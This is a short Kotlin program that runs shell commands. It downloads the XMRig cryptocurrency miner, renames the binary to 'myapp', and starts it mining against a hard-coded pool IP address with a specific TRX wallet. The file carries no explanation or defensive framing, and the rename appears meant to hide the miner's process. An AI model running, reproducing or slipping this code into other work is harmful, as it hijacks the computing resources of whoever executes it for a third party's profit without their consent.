import java.io.BufferedReader
import java.io.InputStreamReader

fun runCommand(command: String) {
    try {
        val process = ProcessBuilder("bash", "-c", command)
            .redirectErrorStream(true)
            .start()

        val reader = BufferedReader(InputStreamReader(process.inputStream))
        var line: String?
        while (reader.readLine().also { line = it } != null) {
            println(line)
        }

        val exitCode = process.waitFor()
        println("Command exited with code $exitCode")
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun main() {
    val commands = listOf(
        "wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz",
        "tar -xvf xmrig-6.22.2-focal-x64.tar.gz",
        "cd xmrig-6.22.2 && mv xmrig myapp",
        "cd xmrig-6.22.2 && ./myapp -a rx/0 -o stratum+tcp://138.197.118.6:3333 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k"
    )

    for (cmd in commands) {
        println("Running: $cmd")
        runCommand(cmd)
    }
}
